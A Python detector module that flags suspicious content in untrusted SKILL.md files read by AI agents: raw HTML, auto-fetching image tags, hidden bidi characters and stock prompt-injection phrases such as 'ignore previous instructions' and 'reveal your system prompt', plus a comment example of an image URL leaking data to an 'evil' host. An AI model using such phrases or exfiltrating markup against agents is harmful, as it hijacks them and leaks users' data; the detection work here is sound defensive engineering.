"""Security scan - treat ``SKILL.md`` as *untrusted* input.

A skill folder is authored by a human (or another agent) and then read by *our*
agents, so its ``SKILL.md`` is an attack surface: Markdown can smuggle embedded
raw HTML (``<script>``, auto-fetching ``<img>``), invisible/bidi control
characters, and disguised "ignore previous instructions" prompt-injection
payloads in either the frontmatter or the body.

This module is a **detector, not a sanitiser**: it never executes, fetches, or
rewrites the maker's content. It only *describes* what it found as a flat list
of human-readable flag strings, which intake records on the
:class:`~chassis.intake.mapper.IntakeReport` so a human reviewer sees exactly
what to inspect at the Certify gate. That mirrors the chassis's "propose, don't
auto-merge" philosophy - scanning never hard-fails a draft.
"""

from __future__ import annotations

import re
from typing import List

# --- 1. Embedded raw HTML -------------------------------------------------
# Dangerous element tags (scripting, embedding, remote resource loading).
_HTML_TAG_RE = re.compile(
    r"<\s*/?\s*(script|style|iframe|object|embed|svg|link|meta|base|form|applet)\b",
    re.IGNORECASE,
)
# Auto-fetching media - an image whose src is fetched on render can exfiltrate
# data via the request URL (``<img src=http://evil/?leak=...>``).
_IMG_TAG_RE = re.compile(r"<\s*img\b", re.IGNORECASE)
# Inline event handlers (onerror=, onload=, onclick=, ...).
_EVENT_HANDLER_RE = re.compile(r"\son[a-z]+\s*=", re.IGNORECASE)
# Active URI schemes inside links/markup.
_ACTIVE_URI_RE = re.compile(r"(javascript|vbscript|data)\s*:", re.IGNORECASE)

# --- 2. Invisible / bidi control characters -------------------------------
# Codepoint -> short label. These render as nothing (or reorder text) yet are
# still tokens an LLM reads, so they hide instructions in plain sight.
_INVISIBLE_CHARS = {
    "\u200b": "U+200B zero-width space",
    "\u200c": "U+200C zero-width non-joiner",
    "\u200d": "U+200D zero-width joiner",
    "\u2060": "U+2060 word joiner",
    "\ufeff": "U+FEFF zero-width no-break space",
    "\u00ad": "U+00AD soft hyphen",
    "\u180e": "U+180E mongolian vowel separator",
    "\u200e": "U+200E left-to-right mark",
    "\u200f": "U+200F right-to-left mark",
    "\u202a": "U+202A left-to-right embedding",
    "\u202b": "U+202B right-to-left embedding",
    "\u202c": "U+202C pop directional formatting",
    "\u202d": "U+202D left-to-right override",
    "\u202e": "U+202E right-to-left override",
    "\u2066": "U+2066 left-to-right isolate",
    "\u2067": "U+2067 right-to-left isolate",
    "\u2068": "U+2068 first strong isolate",
    "\u2069": "U+2069 pop directional isolate",
}

# --- 3. Prompt-injection phrases ------------------------------------------
# High-signal phrases that try to override an agent's instructions. Matched
# case-insensitively with collapsed inner whitespace.
_INJECTION_PHRASES = (
    "ignore previous instructions",
    "ignore all previous instructions",
    "ignore the above",
    "disregard previous instructions",
    "disregard all previous instructions",
    "disregard the above",
    "forget previous instructions",
    "forget all previous instructions",
    "new instructions",
    "system prompt",
    "you are now",
    "act as",
    "override your instructions",
    "ignore your instructions",
    "reveal your system prompt",
    "print your instructions",
    "do not tell the user",
)


def scan_text(text: str) -> List[str]:
    """Return a list of security flags for one block of untrusted text.

    The flags are human-readable strings (deduplicated, order-preserved). An
    empty list means nothing suspicious was detected. This function has no side
    effects - it neither modifies ``text`` nor touches the network or disk.
    """
    flags: List[str] = []

    # 1. Embedded raw HTML.
    for match in _HTML_TAG_RE.finditer(text):
        flags.append(
            f"embedded raw HTML <{match.group(1).lower()}> tag "
            "(possible injection/exfiltration)"
        )
    if _IMG_TAG_RE.search(text):
        flags.append("auto-fetching <img> tag (possible data exfiltration on render)")
    if _EVENT_HANDLER_RE.search(text):
        flags.append("inline HTML event handler attribute (possible script execution)")
    if _ACTIVE_URI_RE.search(text):
        flags.append("active URI scheme (javascript:/vbscript:/data:) in markup")

    # 2. Invisible / bidirectional control characters.
    for char, label in _INVISIBLE_CHARS.items():
        if char in text:
            flags.append(f"invisible/bidi control character {label}")

    # 3. Prompt-injection phrases.
    collapsed = re.sub(r"\s+", " ", text).lower()
    for phrase in _INJECTION_PHRASES:
        if phrase in collapsed:
            flags.append(f"possible prompt-injection phrase: '{phrase}'")

    # Deduplicate while preserving first-seen order.
    seen: set[str] = set()
    unique: List[str] = []
    for flag in flags:
        if flag not in seen:
            seen.add(flag)
            unique.append(flag)
    return unique
